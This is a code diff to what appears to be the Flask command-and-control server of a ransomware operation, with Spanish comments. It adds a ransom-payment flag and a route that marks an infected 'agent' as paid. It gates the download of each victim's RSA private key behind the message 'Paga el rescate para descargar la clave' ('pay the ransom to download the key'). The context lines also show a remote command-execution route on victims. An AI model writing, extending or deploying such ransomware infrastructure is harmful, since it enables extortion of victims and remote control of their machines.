@@ -13,8 +13,8 @@ connected_agents = {}  # Diccionario para almacenar las conexiones de agentes ac
 def index():
     conn = get_db_connection()
     c = conn.cursor()
-    c.execute('SELECT id, ip, mac, so FROM agents')
-    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3]} for row in c.fetchall()]
+    c.execute('SELECT id, ip, mac, so, pay_status FROM agents')
+    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4]} for row in c.fetchall()]
     conn.close()
     
     return render_template('index.html', agents=agents)
@@ -27,7 +27,7 @@ def register_agent():
     private_key_file = request.files.get('private_key')
 
     if not ip or not mac or not so or not private_key_file:
-        return jsonify({'error': 'Faltan IP, MAC o clave privada'}), 400
+        return jsonify({'error': 'Faltan IP, MAC, SO o clave privada'}), 400
 
     private_key_content = private_key_file.read().decode('utf-8')
 
@@ -42,6 +42,18 @@ def register_agent():
     # Devolver el agent_id en formato JSON
     return jsonify({'message': 'Agente registrado con éxito', 'agent_id': agent_id}), 200
 
+@app.route('/pay_agent/<int:agent_id>')
+def pay_agent(agent_id):
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("UPDATE agents SET pay_status = TRUE WHERE id = ?", (agent_id,))
+    conn.commit()
+    # Recuperar la lista actualizada de agentes
+    c.execute('SELECT id, ip, mac, so, pay_status FROM agents')
+    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4]} for row in c.fetchall()]
+    conn.close()
+
+    return render_template('index.html', agents=agents)
 
 @app.route('/view_private_key/<int:agent_id>', methods=['GET'])  # Visualizar clave privada
 def view_private_key(agent_id):
@@ -60,16 +72,16 @@ def view_private_key(agent_id):
 def download_private_key(agent_id):
     conn = get_db_connection()
     c = conn.cursor()
-    c.execute('SELECT private_key FROM agents WHERE id = ?', (agent_id,))
+    c.execute('SELECT private_key, pay_status FROM agents WHERE id = ?', (agent_id,))
     agent = c.fetchone()
     conn.close()
-    
     if not agent:
         return jsonify({'error': 'Agente no encontrado'}), 404
-    
-    private_key_io = BytesIO(agent[0].encode('utf-8'))
+    private_key, pay_status = agent
+    if not pay_status:
+        return jsonify({'error': 'Paga el rescate para descargar la clave'}), 403
+    private_key_io = BytesIO(private_key.encode('utf-8'))
     return send_file(private_key_io, as_attachment=True, download_name="rsa_private.pem", mimetype='application/x-pem-file')
-
 
 @app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
 def execute_command(agent_id):
